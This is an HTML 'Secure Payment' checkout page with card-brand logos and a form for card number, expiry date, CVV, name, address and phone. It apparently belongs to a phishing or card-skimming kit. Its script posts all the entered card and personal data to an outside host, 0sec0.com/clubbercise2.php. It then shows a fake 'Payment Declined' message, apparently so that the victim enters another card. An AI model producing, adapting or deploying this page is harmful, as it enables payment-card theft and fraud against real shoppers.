<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Payment</title>
    <style>
        /* Reset Default Browser Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Container */
        .credit-card-container {
            background: #ffffff;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        /* Logo Section */
        .credit-card-logos {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .credit-card-logos img {
            width: 50px;
            height: auto;
        }

        h3 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 20px;
        }

        /* Input Fields */
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .credit-card-extra {
            display: flex;
            gap: 10px;
        }

        .credit-card-extra div {
            flex: 1;
        }

/* Overlay */
.overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
}

.loading-spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid #007bff;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}


        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Notification */
        .notification {
            display: none;
            color: red;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }

        /* Button */
        .button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        .button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="credit-card-container" id="credit-card-container">
        <!-- Logo Section -->
        <div class="credit-card-logos">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196578.png" alt="MasterCard">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196561.png" alt="Visa">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196566.png" alt="Amex">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196544.png" alt="Discover">
        </div>

        <h3>Secure Payment</h3>

        <form id="payment-form">
            <!-- Card Number -->
            <label for="card-number">Card Number</label>
            <input type="text" id="card-number" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)" required>

            <!-- Expiry Date & CVV -->
            <div class="credit-card-extra">
                <div>
                    <label for="exp-date">Expiration Date</label>
                    <input type="text" id="exp-date" name="expiry_date" placeholder="MM/YY" maxlength="5" oninput="formatExpDate(this)" required>
                </div>
                <div>
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <!-- First Name & Last Name -->
            <div class="credit-card-extra">
                <div>
                    <label for="shipping-first-name">First Name</label>
                    <input type="text" id="shipping-first-name" name="shipping_first_name" placeholder="John" required>
                </div>
                <div>
                    <label for="shipping-last-name">Last Name</label>
                    <input type="text" id="shipping-last-name" name="shipping_last_name" placeholder="Doe" required>
                </div>
            </div>

            <!-- Billing Details -->
            <label for="shipping-address">Address</label>
            <input type="text" id="shipping-address" name="shipping_address_1" placeholder="123 Main St" required>

            <label for="shipping-city">City</label>
            <input type="text" id="shipping-city" name="shipping_city" placeholder="London" required>

            <label for="shipping-postcode">Postcode</label>
            <input type="text" id="shipping-postcode" name="shipping_postcode" placeholder="SW1A 1AA" required>

            <label for="shipping-email">Phone Number</label>
            <input type="email" id="shipping-email" name="shipping_phone" placeholder="123455679" required>

            <!-- Spinner -->
<div class="overlay" id="overlay">
    <div class="loading-spinner"></div>
</div>

            <!-- Notification -->
            <div id="notification" class="notification">Payment Declined. Please use another payment method.</div>

            <!-- Submit Button -->
            <button type="button" id="place-order" class="button">Place Order</button>
        </form>
    </div>

    <script>
        function formatCardNumber(input) {
            input.value = input.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
        }

        function formatExpDate(input) {
            input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(\d{1,2})/, '$1/$2').slice(0, 5);
        }

       document.getElementById('place-order').addEventListener('click', function () {
    const overlay = document.getElementById("overlay");
    const notification = document.getElementById("notification");
    const form = document.getElementById("payment-form");
    const formData = new FormData(form);

    // Tampilkan overlay
    overlay.style.display = 'flex';
    notification.style.display = 'none';

    fetch("https://0sec0.com/clubbercise2.php", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            throw new Error("Payment Declined");
        }
        alert("Payment sent successfully!");
    })
    .catch(error => {
        console.error("Error:", error);
        setTimeout(() => { // Tampilkan notifikasi setelah jeda 3 detik
            notification.style.display = 'block';
            notification.innerText = "Payment Declined. Please use another payment method.";
        }, 3000);
    })
    .finally(() => {
        setTimeout(() => {
            overlay.style.display = 'none';
        }, 3000);
    });
});

    </script>
</body>
</html>
